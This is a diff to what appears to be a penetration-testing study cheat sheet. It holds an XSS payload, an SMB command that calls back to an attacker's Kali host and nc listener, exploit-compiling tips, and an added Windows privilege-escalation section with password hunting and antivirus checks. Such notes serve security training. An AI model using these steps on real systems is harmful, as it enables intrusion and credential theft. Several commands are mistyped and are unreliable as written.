@@ -1,3 +1,5 @@
+- the appropriate msfvenom payload for each webserver. you need to check the framework from wappalyzer
+-     https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
 ------------------------------------------------------------------cross site scripting-----------------------------------------------------------------------
 - XSS SCRIPTS
 -      <ScRipT>alert("XSS");</ScRipT>
@@ -64,8 +66,6 @@ To automate the process, use the following tools
 -     rm ~/.ssh/know_hosts
 -     ssh -p <port> -i <file> root@10.0.2.10
 
-- ftp service
--     put test.txt
 -----------------------------------------------------------------SQL INJECTION-------------------------------------------------------------------------
 - Cheat Sheet
 -     https://portswigger.net/web-security/sql-injection/cheat-sheet
@@ -201,7 +201,7 @@ use the following website for the rainbow table attack
 -     dir \\<Kali_IP>\test
 - fourthly, you will receive a connection on the nc listener
  
------------------------------------------------------------------Searching for Ecploits-------------------------------------------------------------------------
+-----------------------------------------------------------------Searching for Exploits-------------------------------------------------------------------------
 - https://www.exploit-db.com/
 - searchsploit
 - nmap scripting engine
@@ -210,6 +210,32 @@ use the following website for the rainbow table attack
 -     i686-w64-mingw32-gcc <42341.c> -o <exploit.exe> -lws2_32
 - assuming that the website has an SSL certificate on the browser. you need to fix the exploit by adding 'verify=False' in the post request.
 -     response = requests.post(url, data=data, allow_redirects=False, verify=False)
+
+-----------------------------------------------------------------Windows Privilege Escalation TCM---------------------------------------------------------------------
+- https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources
+- system enum
+-     systeminfo
+-     check the patches --> wmic qfe
+-     list the drives ex. C: D: --> wimc logicaldisk
+-     list the drives ex. C: D: --> wmic logicaldist get caption,description,providername
+- user enum and groups
+-     whoami
+-     whoami /priv
+-     whoami /groups
+-     show all users on the machine --> netuser
+-     gather info about X user --> net user <username>
+-     check all users in X group --> localgroup <groupname>
+- network enum
+-     ipconfig /all
+-     arp -a
+-     check the routing table --> route print
+-     check open ports on the machine --> netstat -ano
+- password hunting
+-     findstr /si password *.txt *.ini *.config
+- firewall & Antivirus
+-     sc query windefend
+-     netsh firewall show state
+-     netsh advfirewall firewall dump
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
